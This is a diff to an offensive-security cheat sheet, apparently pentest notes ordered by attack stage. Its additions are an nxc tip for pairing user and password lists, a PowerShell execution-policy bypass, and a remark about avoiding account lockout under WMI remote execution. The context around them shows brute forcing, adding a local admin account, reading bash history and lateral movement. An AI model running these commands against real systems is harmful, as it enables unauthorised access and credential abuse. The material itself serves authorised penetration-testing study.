@@ -221,6 +221,7 @@ with rsa private key, over port 10000
 ### nxc
 	nxc <proto> 123.123.123.123 --port 8000 -u <filename|name> -p <filename|name> --continue-on-success
 Bruteforce usernames and passwords via the protocol on port 8000  
+Add `--no-brute-force` with userfile and passfile to iterate user1:pass1, user2:pass2, etc.  
 
 ### SMB
 	smbclient -L //123.123.123.123 -U username%password
@@ -379,6 +380,9 @@ Event ID 4104 in App-Log>Microsoft/Windows/Powershell/Operational.
 ## Windows - impersonate token
 	https://www.offsec.com/metasploit-unleashed/fun-incognito/
 
+## Windows - ExecutionPolicy
+	Set-ExecutionPolicy Bypass -Scope Process -Force
+
 ## Windows - add new admin user
 	net user "Username" "Password" /add
 	net localgroup administrators "Username" /add
@@ -465,7 +469,7 @@ Generate passhash with `openssl passwd <password>`
 	history
 .  
 
-cat ~/.bash_history
+	cat ~/.bash_history
 
 ## Linux - env
 	env
@@ -566,6 +570,7 @@ listen for smb connections and relay them to 123.123.123.130 and execute command
 # STAGE 4 - LATERAL MOVEMENT
 ## CMD wmi
 	wmic /node:123.123.123.123 /user:user /password:password process call create "powershell -e ..."
+Bypasses account lockout restrictions  
 
 ## Powershell CimSession
 	$secureString = ConvertTo-SecureString 'password' -AsPlaintext -Force
